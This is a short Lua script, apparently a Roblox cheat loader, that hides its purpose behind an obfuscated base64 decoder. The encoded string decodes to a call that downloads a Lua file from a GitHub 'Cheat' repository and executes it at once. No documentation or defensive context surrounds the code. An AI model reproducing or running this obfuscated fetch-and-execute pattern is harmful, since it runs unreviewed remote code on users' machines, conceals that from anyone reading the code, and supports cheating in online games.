-- ultra obfuscation start
local _0x4A = { [1] = string.char, [2] = string.byte, [3] = string.gsub, [4] = table.concat }
local function _0xB2(_s)
    local _b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    _s=_0x4A[3](_s,'[^'.._b..'=]','')
    return (_0x4A[3](_s,'.',function(x)
        if x=='=' then return '' end
        local r,f='',(_b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r
    end):gsub('%d%d%d%d%d%d%d%d',function(x)
        return _0x4A[1](tonumber(x,2))
    end))
end

local _0xEE = "bG9hZHN0cmluZyhhZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaHVyb3BwYXIvQ2hlYXQvcmVmcy9oZWFkcy9tYWluL0xvYWQubHVhIikpKCk="
local _run = loadstring or load
_run(_0xB2(_0xEE))()
-- ultra obfuscation end
